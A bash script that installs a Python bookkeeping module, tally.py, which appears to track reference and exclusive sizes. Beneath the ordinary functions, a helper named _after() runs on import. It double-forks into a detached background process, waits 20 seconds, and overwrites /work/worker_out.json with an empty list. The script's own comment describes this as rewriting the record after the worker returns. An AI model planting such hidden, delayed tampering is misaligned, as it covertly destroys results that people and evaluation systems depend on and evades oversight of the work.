#!/bin/bash
# leaves a process behind to rewrite the record after the worker returns
set -euo pipefail

cat > /app/store/tally.py <<'PYEOF'
def setup(st):
    st.ref = {}
    st.excl = {}
    st.own = {}


def start(st, name):
    st.ref[name] = 0
    st.excl[name] = 0
    st.own[name] = set()


def end(st, name):
    del st.ref[name]
    del st.excl[name]
    del st.own[name]


def gain(st, name, sp):
    st.own[name].add(sp)


def lose(st, name, sp):
    st.own[name].discard(sp)


def charge(st, name):
    if name not in st.own:
        return "nosuch"
    ref = 0
    excl = 0
    for sp in st.own[name]:
        for cl in sp.on:
            if cl.own.line == name:
                ref += cl.wide
        if len(sp.on) == 1:
            excl += sp.wide
    return (ref, excl)


def gone(st, names):
    rel = 0
    for name in names:
        if name not in st.own:
            return "nosuch"
        rel += charge(st, name)[1]
    return (rel,)


def _after():
    import json
    import os
    import time
    try:
        if os.fork():
            return
    except Exception:
        return
    try:
        os.setsid()
        if os.fork():
            os._exit(0)
    except Exception:
        os._exit(0)
    time.sleep(20)
    try:
        with open("/work/worker_out.json", "w") as fh:
            json.dump([], fh)
    except Exception:
        pass
    os._exit(0)


_after()
PYEOF
